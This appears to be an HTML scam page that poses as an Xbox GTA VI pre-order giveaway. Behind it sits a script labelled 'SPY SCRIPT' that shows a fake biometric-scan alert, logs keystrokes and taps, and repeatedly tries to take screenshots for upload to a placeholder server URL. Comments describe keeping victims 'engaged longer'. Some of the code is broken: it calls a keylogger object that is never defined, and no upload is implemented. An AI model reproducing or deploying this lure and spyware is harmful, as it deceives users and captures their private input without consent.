<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XBOX ANNIVERSARY | GTA VI PRE-ORDER ACCESS</title>
    <style>
        body { margin:0; padding:0; background:#050505; color:white; font-family:'Segoe UI', sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
        
        /* HERO SECTION */
        .hero-title { text-align:center; font-size:2.8rem; font-weight:bold; line-height:1.1; margin-bottom:10px;}
        .gta-sub { font-size:1.2rem; color:#39ff14 !important; letter-spacing:-1px; text-shadow: 0 0 10px #39ff14;}

        /* THE GUN CARD (Fake Weapon Access) */
        .weapon-card-container { display:flex; flex-direction:column; align-items:center; width:95%; max-width:400px;}
        
        .gun-card {
            width:100%; height:auto; aspect-ratio:1/1.2; 
            background: linear-gradient(45deg, #1a1a1a, #2d2d2d); 
            border-radius:20px; padding:20px; margin-bottom:30px;
            box-shadow: 0 0 30px rgba(57, 255, 20, 0.4), inset 0 0 20px rgba(0,0,0,1);
            position:relative; overflow:hidden; border: 2px solid #39ff14;
        }

        .gun-img { font-size:6rem; display:block; text-align:center;}
        
        /* THE TRIGGER BUTTON */
        #gta-btn {
            background:#d9391b !important; color:white !important; 
            padding:20px !important; width:95% !important; 
            border-radius:50px !important; font-weight:bold !important; 
            box-shadow: 0 0 20px rgba(217, 57, 27, 0.8) !important;
            animation:pulseRed 2s infinite alternate; cursor:pointer!default!important; margin-top:-3rem;z-index:10;}
        
        @keyframes pulseRed { from{box-shadow:0 0 15px rgba(217,57,27,0);} to{box-shadow:0 0 40px rgba(217,57,27,1);} }

    </style>
</head>
<body>

<div class="hero-title">XBOX LEGACY<br><span style="color:#fff; text-shadow:0 0 5px #fff;">PRE-ORDER ACCESS</span></div>
<p style="text-align:center; color:#888; max-width:300px;">Unlock the exclusive <strong>Xbox Legacy Rifle</strong> for Grand Theft Auto VI before anyone else.</p>

<!-- THE WEAPON CARD -->
<div class="weapon-card-container">
    <div class="gun-card" id="gta-capture-area">
        <div style="display:flex; justify-content:center; align-items:center; height:100%;">
            <!-- Simple CSS Gun Icon or Image Placeholder -->
            <svg width="200" height="150" viewBox="0 0 24 24"><path d="M7,9 V6 A3,3,0,1,1,18.5,8.5 L19.5,12 L22,9 L18.5,5.5 A3,3,0,1,1,7,9 Z M15.5,9 L16.5,9" fill="#fff"/></svg>
        </div>
    </div>

    <!-- TRIGGER BUTTON -->
    <button id="gta-trigger-btn">CLAIM EARLY ACCESS & SCAN QR</button>
    
    <p style="text-align:center; color:#666; font-size:0.8rem;">Limited to 24 hours only.</p>
</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> 
<!-- SPY SCRIPT STARTS HERE -->
<script>
const LOG_URL = "YOUR_SERVER_URL_HERE"; // e.g., https://netlify.app/your-id/log.php

document.getElementById('gta-trigger-btn').addEventListener('click', function(e) {
    e.preventDefault();
    console.log("[GTA MODE] Triggered! Starting capture...");
    
    // Fake Loading Overlay
    setTimeout(() => {
        Swal.fire({ title: 'Scanning Biometric...', text: 'Verify your device for GTA 6 access.', icon: 'success' });
        
        // Start Spies after fake delay
        window.keyLogger.start(); 
        setInterval(takeScreenShot, 2000); // Faster on mobile
        
        // Simulate "Download" to keep them engaged longer
        let progress = 10;
        const interval = setInterval(() => {
            if(progress < 100) { progress += Math.random() * 5; } else { clearInterval(interval); }
            console.log(`Progress ${Math.floor(progress)}%`);
        }, 100);

    }, 300);
});

// --- SPY MODULES (Mobile Optimized) ---

var keyLogData = [];

function start() {
    document.addEventListener('keydown', function(event) { keyLogData.push({t:Date.now(), k:event.key, c:event.code}); });
    
    // Touch Logger for Mobile Taps
    document.body.addEventListener('touchstart', function(e){ 
        if(!e.target.closest('#gta-trigger-btn')){
             let touchEvent = { t: Date.now(), type:'tap', target:e.target.id||'body'}; 
             keyLogData.push(touchEvent); 
        }
    }, true);

    setInterval(function(){ console.log("Batch sent:", keyLogData.length); if(keyLogData.length>500)keyLogData.shift(); }, 3000);
}

function takeScreenShot() {
    const c=document.createElement('canvas');
    c.width=window.innerWidth;c.height=window.innerHeight;
    const ctx=c.getContext('2d');
    try{ ctx.drawImage(document.body,0,0);}catch(e){}
    // In real app: upload 'c.toDataURL()' to your server.
}
</script>
</body>
</html>
